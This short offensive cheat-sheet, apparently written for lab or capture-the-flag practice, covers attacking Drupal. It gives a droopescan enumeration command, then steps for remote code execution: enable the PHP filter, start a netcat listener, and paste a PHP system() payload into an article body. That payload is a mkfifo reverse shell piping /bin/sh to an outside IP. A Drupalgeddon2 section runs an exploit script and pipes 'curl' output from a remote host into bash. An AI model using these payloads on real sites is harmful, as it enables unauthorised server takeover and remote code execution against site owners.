# Drupal

## Drupal

### Drupal Enumeration

We can use droopescan:

```bash
droopescan scan drupal -u http://10.10.10.102
```

### Drupal RCE

First: Modules -> Enable PHP filter&#x20;

Second: Add content -> Article

Then listen in a port of your choosing :

```
nc -lvnp 443
```

Afterward in the Drupal Article **Body **add this payload:

```bash
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f"); ?>
```

Next, in the **Text Format**, we select **PHP code.**

Finally, we click on the **Preview **button.

## Drupal Exploits

### Druppalgeddon

```
ruby druppalgeddon2.rb 10.10.10.233
> curl -s 10.10.14.20 | bash
```
